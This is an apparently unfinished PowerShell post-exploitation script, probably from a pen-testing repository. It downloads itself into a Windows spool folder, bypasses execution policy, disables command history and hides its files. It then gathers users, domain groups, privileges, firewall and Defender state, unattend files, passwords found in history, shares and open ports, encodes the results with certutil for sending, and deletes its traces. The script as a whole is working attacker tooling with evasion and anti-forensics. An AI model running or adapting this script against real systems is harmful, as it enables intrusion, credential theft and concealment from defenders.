#Work in progress!!!
<#
Download script:
(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/h1dz/Pen-Testing/BashScripts/webenum.ps1", "C:\Windows\System32\spool\drivers\color\winenum.ps1")
#>
################################## Setup ##################################
powershell Set-Executionpolicy -ExecutionPolicy bypass -Scope CurrentUser
Set-PSReadlineOption -HistorySaveStyle SaveNothing
attrib +h webenum.ps1
Unblock-File -Path .\webenum.ps1
powershell -ExecutionPolicy Bypass -noninteractive -nologo -File .\webenum.ps1
New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\1.txt"
Unblock-File -Path "C:\Windows\System32\spool\drivers\color\1.txt"
powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\1.txt"
New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\2.txt"
Unblock-File -Path "C:\Windows\System32\spool\drivers\color\2.txt"
powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\2.txt"
attrib +h 1.txt
attrib +h 2.txt
Write-Output "################################## Start ##################################" | Out-File -FilePath .\1.txt -Append  
Write-Output "###########################################################################" | Out-File -FilePath .\1.txt -Append
Write-Output "################################## User Data ##################################" | Out-File -FilePath .\1.txt -Append
hostname | Out-File -FilePath .\1.txt -Append  
whoami | Out-File -FilePath .\1.txt -Append
Get-LocalUser | Out-File -FilePath .\1.txt -Append  
Get-Acl C:\ | Out-File -FilePath .\1.txt -Append  
net user | Out-File -FilePath .\1.txt -Append  
net user /domain | Out-File -FilePath .\1.txt -Append 
net user $domain_user /domain | Out-File -FilePath .\1.txt -Append 
net group /domain | Out-File -FilePath .\1.txt -Append   
Write-Output "################################## PC Info ##################################" | Out-File -FilePath .\1.txt -Append
wmic os get osarchitecture | Out-File -FilePath .\1.txt -Append 
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" | Out-File -FilePath .\1.txt -Append 
systeminfo | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Privs ##################################" | Out-File -FilePath .\1.txt -Append
whoami /priv | Out-File -FilePath .\1.txt -Append 
whoami /groups | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Firewall Info ##################################" | Out-File -FilePath .\1.txt -Append
Netsh Advfirewall show allprofiles | Out-File -FilePath .\1.txt -Append 
netsh firewall show state | Out-File -FilePath .\1.txt -Append 
netsh firewall show config | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Defender Info ##################################" | Out-File -FilePath .\1.txt -Append
Get-MpComputerStatus | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## IP ##################################" | Out-File -FilePath .\1.txt -Append
ipconfig /all | Out-File -FilePath .\1.txt -Append  
Write-Output "################################## Passwords ##################################" | Out-File -FilePath .\1.txt -Append
Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File -FilePath .\1.txt -Append 
Get-Content "C:\Windows\Panther\Unattend\Unattended.xml" | Out-File -FilePath .\1.txt -Append
Get-Content (Get-PSReadlineOption).HistorySavePath | Select-String password  | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Shares ##################################" | Out-File -FilePath .\1.txt -Append
net share | Out-File -FilePath .\1.txt -Append  
Write-Output "################################## Execution Policy ##################################" | Out-File -FilePath .\1.txt -Append
Get-ExecutionPolicy -list | Out-File -FilePath .\1.txt -Append  
Write-Output "################################## Scheduled Tasks ##################################" | Out-File -FilePath .\1.txt -Append
schtasks /query /fo LIST /v | Out-File -FilePath .\1.txt -Append
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Backup Files ##################################" | Out-File -FilePath .\1.txt -Append
Get-ChildItem -Path C: -Include .bak -File -Recurse -ErrorAction SilentlyContinue | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Patches ##################################" | Out-File -FilePath .\1.txt -Append
Get-Hotfix | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Hidden Files ##################################" | Out-File -FilePath .\1.txt -Append
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Running Processes ##################################" | Out-File -FilePath .\1.txt -Append
Get-Process | Out-File -FilePath .\1.txt -Append 
# Write ports to check
Write-Output "Scanning Top 20 Open Ports..." | Out-File -FilePath .\2.txt -Append 
Write-Output "21" | Out-File -FilePath .\2.txt -Append 
Write-Output "22" | Out-File -FilePath .\2.txt -Append
Write-Output "23" | Out-File -FilePath .\2.txt -Append 
Write-Output "25" | Out-File -FilePath .\2.txt -Append 
Write-Output "53" | Out-File -FilePath .\2.txt -Append 
Write-Output "80" | Out-File -FilePath .\2.txt -Append 
Write-Output "110" | Out-File -FilePath .\2.txt -Append 
Write-Output "111" | Out-File -FilePath .\2.txt -Append 
Write-Output "135" | Out-File -FilePath .\2.txt -Append 
Write-Output "143" | Out-File -FilePath .\2.txt -Append 
Write-Output "443" | Out-File -FilePath .\2.txt -Append 
Write-Output "445" | Out-File -FilePath .\2.txt -Append 
Write-Output "993" | Out-File -FilePath .\2.txt -Append 
Write-Output "996" | Out-File -FilePath .\2.txt -Append 
Write-Output "1723" | Out-File -FilePath .\2.txt -Append 
Write-Output "2049" | Out-File -FilePath .\2.txt -Append
Write-Output "3306" | Out-File -FilePath .\2.txt -Append 
Write-Output "3389" | Out-File -FilePath .\2.txt -Append 
Write-Output "5900" | Out-File -FilePath .\2.txt -Append 
Write-Output "8080" | Out-File -FilePath .\2.txt -Append 
Write-Output "################################## Open Ports ##################################" | Out-File -FilePath .\1.txt -Append
$system_ports = Get-NetTCPConnection -State Listen

$text_port = Get-Content -Path C:\Windows\System32\spool\drivers\color\2.txt

foreach($port in $text_port){

    if($port -in $system_ports.LocalPort){
        Write-Output $port" = OPEN" | Out-File -FilePath .\1.txt -Append 
     }

}

Write-Output "##############################################################################" | Out-File -FilePath .\1.txt -Append
Write-Output "################################## Finished ##################################" | Out-File -FilePath .\1.txt -Append  
# Encode
certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 0.txt
# Send output file

# Remove bash history
# Remove-Item %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Remove-Item C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Remove-Item 1.txt
Remove-Item 2.txt
Clear-Host
Remove-Item webenum.ps1
